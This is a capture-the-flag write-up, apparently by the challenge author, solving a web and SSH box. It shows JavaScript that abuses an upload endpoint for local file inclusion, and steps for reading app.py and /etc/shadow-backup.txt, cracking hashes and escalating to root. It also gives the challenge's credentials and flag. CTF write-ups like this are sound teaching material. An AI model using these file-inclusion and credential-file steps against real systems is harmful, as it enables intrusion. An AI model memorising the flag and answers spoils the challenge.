# Writeup

First step is to realise they can lfi by changing the request parameter to `source: internal`, this will LFI as intended, check if file exists, if it does, pass that in a call to ffmpeg and encode that into a video.

You can use this JS TO test easily
```js
async function LFI(inp){
    let fd = new FormData();
    fd.append("file", inp);
    fd.append("source", "internal");
    const ctrl = new AbortController()

    try {
      document.getElementById("card-actions-first").innerHTML = lpbar;
      initElement("mdc-linear-progress", mdc.linearProgress.MDCLinearProgress.attachTo);
      displayMDCSnackbar("Uploading Video, please wait", 10000)
       let req = await fetch('/upload/content',
        {method: "POST", body: fd, signal: ctrl.signal}).then(resp => resp.json()).then(data => displayMDCSnackbar(data.message, 4000));
       setTimeout(function(){location = ''}, 4000);
    } catch(e) {
      setTimeout(function(){location = ''}, 4000);
      displayMDCSnackbar("Upload Failed: " + e, 4000)
    }

}
```

Then invoke by calling `LFI("uploads/note.txt")`

How would they find that path? Well they'd have to LFI the python code first to find a route for `uploads/note.txt`. Using our function earlier, they can just do `LFI("app.py")`

Then, very painfully they extract the two parts of the password, hashed in ARGON2 which is nortoriously memory intensive. However the first bit is `password` and the second bit is `qwertyuiop` so literally any wordlist will find it.

Then they login as SSH on port 42069 (haha yes very funny I know), with the creds `admin` (hinted at in the note) and password `passwordqwertyuiop`.

From here are able to read `/etc/shadow-backup.txt`, crack the SHA512 hash which comes out to be `ubisoft` then switch user to root (can't login as root on SSH).

Once logged in, just `cat /root/root.txt`

# Flag

`ractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}`
